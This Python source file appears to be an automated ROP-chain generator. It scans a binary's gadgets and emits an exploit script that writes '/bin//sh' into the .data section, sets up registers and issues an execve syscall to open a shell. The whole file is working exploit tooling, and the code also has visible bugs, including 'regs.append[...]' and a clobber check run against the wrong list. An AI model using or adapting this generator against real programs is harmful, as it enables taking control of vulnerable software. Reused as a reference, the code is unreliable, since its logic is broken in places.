import struct
import sys
import re
import itertools
from functools import reduce

REGISTERS = [   "rax", "rbx", "rcx", "rdx", "rdi", "rsi", "rbp", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
            ]

gadgetList = None

def operands(csinsn):
    return csinsn.op_str.split(', ')

def memoize(f):
    memopad = {}
    def g(*args):
        try:
            if args in memopad: return memopad[args]
            ret = f(*args)
            memopad[args] = ret
            return ret
        except Exception:
            import traceback
            traceback.print_exc() 
    return g

# Padding in qwords
# Returns a pair (int, [register]) that tells how many qwords on the stack the series of
# instructions consumes, and what registers it clobbers
def getPaddingAndClobbers(insns):
    pad = 0
    regs = []
    for insn in insns:
        ops = operands(insn)
        if insn.mnemonic == 'pop':
            regs.append(ops[0])
            pad += 1
        elif insn.mnemonic == 'ret':
            raise Exception('ret in interior of gadget.')
        elif len(ops) > 0:
            if ops[0] in REGISTERS:
                regs.append[ops[0]]
    return (pad, regs)

def writeGadget(gadget):
    return "payload += struct.pack('<Q', offset+" + hex(int(gadget[0].address)) + ")\t\t# " + str(gadget) + "\n\t"

def writePadding(n):
    acc = ''
    for _ in range(n):
        acc += "payload += struct.pack('<Q', 0xdeadbeefdeadbeef)\t\t# Padding\n\t"
    return acc

# Find all gadgets that begin with a pop into reg.
# They also ought to end in ret.
@memoize
def getPopGadgets(reg):
    acc = []
    for g in gadgetList:
        if g[0].mnemonic == 'pop' and operands(g[0])[0] == reg and g[-1].mnemonic == 'ret':
            acc.append(g)
    acc.sort(key=len) # Prefer gadgets with fewer pops -- less padding, less clobbering
    return acc

# Find all gadgets that set a register value to 0.
@memoize
def getZeroingGadgets(reg):
    acc = []
    for g in gadgetList:
        if g[-1].mnemonic != 'ret': continue
        if g[0].mnemonic == 'mov':
            ops = operands(g[0])
            if ops[0] == reg and ops[1] == "0":
                acc.append(g)
        elif g[0].mnemonic == 'xor':
            ops = operands(g[0])
            if ops[0] == reg and ops[1] == ops[0]:
                acc.append(g)
    acc.sort(key=len)
    return acc

# Get gadgets that can increment the given reg
@memoize
def getIncrementingGadgets(reg):
    acc = []
    for g in gadgetList:
        if g[-1].mnemonic != 'ret': continue
        if g[0].mnemonic == 'add':
            ops = operands(g[0])
            if ops[0] == reg and ops[1] == "1":
                acc.append(g)
        if g[0].mnemonic == 'inc':
            ops = operands(g[0])
            if ops[0] == reg:
                acc.append(g)
    acc.sort(key=len)
    return acc

def makeLoadSmallConstIntoRegSeq(reg, noClobber = []):
    for g in getZeroingGadgets(reg):
        (zeroingPad, zeroingClobbers) = getPaddingAndClobbers(g[1:-1])
        if any([x in noClobber + [reg] for x in zeroingClobbers]): continue
        ops = operands(g[0])
        incrGadgets = getIncrementingGadgets(reg)
        for incrGadget in incrGadgets:
            (incrPad, incrClobbers) = getPaddingAndClobbers(incrGadget[1:-1])
            if any([x in noClobber + [reg] for x in incrGadget]): continue
            def loadSmallConstIntoReg(const, comment = ''):
                ret = ''
                if comment: ret += "# " + comment + "\n\t"
                ret += writeGadget(g)
                ret += writePadding(zeroingPad)
                for i in range(const):
                    ret += writeGadget(incrGadget)
                    ret += writePadding(incrPad)
                return ret
            return loadSmallConstIntoReg
    raise Exception("No gadget for zeroing and incrementing register " + reg);

def makeLoadConstIntoRegSeq(reg, noClobber = []):
    regList = getPopGadgets(reg)
    # Search for "pop Reg; ret"
    for gadget in regList:
        (padding, clobbers) = getPaddingAndClobbers(gadget[1:-1])
        if any([x in noClobber + [reg] for x in clobbers]):
            continue
        # "pop Reg; . . . ; ret" is found
        def loadConstIntoReg(const, comment = '', isOffset = False):
            # Write our output code:
            # Write address of "pop Reg; ret"
            ret = writeGadget(gadget)
            # Write const onto stack
            ret += "payload += struct.pack('<Q', " + ("offset+" if isOffset else '') + hex(const) + ")"
            if comment:
                ret += '\t\t# ' + comment
            ret += "\n\t"
            # Pad additional pops
            ret += writePadding(padding)
            return ret
        return loadConstIntoReg
    
    raise Exception("Unable to find necessary gadgets to load a value into register " + reg)

def makeLoadConstsIntoRegsSeq(regs, noClobber = [], isSmall = []):
    for p in itertools.permutations(regs):
        try:
            acc = []
            regs_done = []
            smallMap = { reg : smallReg for (reg, smallReg) in itertools.zip_longest(regs, isSmall, fillvalue=False)}
            for reg in p:
                if smallMap[reg]:
                    acc.append(makeLoadSmallConstIntoRegSeq(reg, noClobber+regs_done))
                else:
                    acc.append(makeLoadConstIntoRegSeq(reg, noClobber + regs_done))
                regs_done.append(reg)
            regLoaders = zip(p, acc)
            def loadConstsIntoRegs(consts, comments = [], isOffsets = []):
                valsToLoad = dict(zip(regs, itertools.zip_longest(consts, comments, isOffsets)))
                return reduce(lambda acc, regLoader: acc + regLoader[1](*valsToLoad[regLoader[0]][0:(2 if smallMap[regLoader[0]] else 3)]), regLoaders, '')
            return loadConstsIntoRegs
        except Exception: continue
    raise Exception("No way to load constants into all of the registers " + str(regs) + " in any order.")


def LoadConstIntoReg(reg, noClobber, const, comment = '', isOffset = False):
    return makeLoadConstIntoRegSeq(reg, noClobber)(const, comment, isOffset)

def loadConstsIntoRegs(regs, noClobber, consts, isSmall = [], comments = [], isOffsets = []):
    return makeLoadConstsIntoRegsSeq(regs, noClobber, isSmall)(consts, comments, isOffsets)

def getMovQwordGadgets():
    movQwordGadgets = list()
    
    for gadget in gadgetList:
        if len(gadget) == 2 and gadget[0].mnemonic == 'mov' and gadget[-1].mnemonic == 'ret':
                ops = operands(gadget[0])
                if re.search("^qword ptr \\[[a-z]+\\]$", ops[0]) and ops[1] in REGISTERS:
                    movQwordGadgets.append(gadget)
    
    return movQwordGadgets

def makeQwordLoadSeq(isSmall = False):
    movQwordGadgets = getMovQwordGadgets()
    for g in movQwordGadgets:
        ops = operands(g[0])
        dest = ops[0][-4:-1]
        src = ops[1]
        if dest == src: continue
        try:
            loadConsts = makeLoadConstsIntoRegsSeq([src, dest], [], [isSmall, False])
            return lambda qword, addr: loadConsts([qword, addr], [str(struct.pack("<Q", qword)), "Location to write"], [False, True]) + writeGadget(g)
        except Exception:
            continue 
    raise Exception("Could not combine gadgets to write to arbitary memory.") 

def WriteStuffIntoMemory(data, addr):
    writeFunc = makeQwordLoadSeq()
    smallWriter = None
    acc = ''
    while len(data) > 0:
        if len(data) <= 8:
            data_piece = data
            data = ''
        
        else:
            data_piece = data[:8]
            data = data[8:]

        data_int = int.from_bytes(data_piece, byteorder = 'little')
        if data_int < 256:
            if not smallWriter:
                smallWriter = makeQwordLoadSeq(True)
            acc += smallWriter(data_int, addr)
        else:
            acc += writeFunc(data_int, addr)
        addr += 8
    return acc

def getSyscallGadgets():
    syscallList = list()
    x = 0
    for gadget in gadgetList:
        if len(gadget) != 1: continue # We're only interested in bare syscall right now.
        inst = gadget[0]
        if inst.mnemonic == "syscall": 
            syscallList.append(gadget)
        
    
    return syscallList

header = '''#!/usr/bin/env python3
import struct

if __name__ == '__main__' :
\t# Enter the amount of junk required
\tpayload = b''
\t
\t# Enter offset of the binary loaded in memory
\toffset = 0
\t
\t'''

footer='''
\tfd = open('payload.txt', 'wb')
\tfd.write(payload)
\tfd.close()    
'''

def execveROPChain(GadgetList, elf):
    global gadgetList
    print("\n\n-->Chaining to get a shell using execve system call")
    """ Get a section from the file, by name. Return None if no such
            section exists.
    """
    data_section_addr = elf.getDataSegment().address
    gadgetList = GadgetList
    execve_bin_sh(data_section_addr)
    sys.exit()

def execve_bin_sh(data_section_addr):
    # Step-1: Open the file where the payload is written in the form of a python script
    fd = open("execveROPChain.py", "w")
    fd.write(header)
    
    # Step-2: Writing "/bin/sh\x00" into .data section
    binsh = b'/bin//sh\x00\x00\x00\x00\x00\x00\x00\x00'
    fd.write(WriteStuffIntoMemory(binsh, data_section_addr))
    
    # TODO: Make a LoadSmallCosntIntoReg that loads constants smaller than 256.
    # We need to prevent null bytes if possible.
    
    # Step-3: Write appropriate register values: 
    # rax <- 59
    # rdi <- "Address of /bin//sh" - .data section's address
    # rsi <- 0
    # rdx <- 0
    fd.write(loadConstsIntoRegs(\
        ["rax", "rdi", "rsi", "rdx"], \
        comments = ["prep rax for execve syscall", "command to run", "pointer to null", "pointer to null"], \
        isSmall = [True, False, False, False], noClobber = [], \
        consts = [59, data_section_addr, data_section_addr+8, data_section_addr+8], isOffsets = [False, True, True, True]))
    
    # Get syscall
    syscallList = getSyscallGadgets()
    if len(syscallList) == 0: 
        raise Exception("No syscall gadget found.")
    
    fd.write(writeGadget(syscallList[0]))
    fd.write(footer)
    fd.close()
    print("-->Written the complete payload in execveROPChain.py")
    print("-->Chaining successful!")
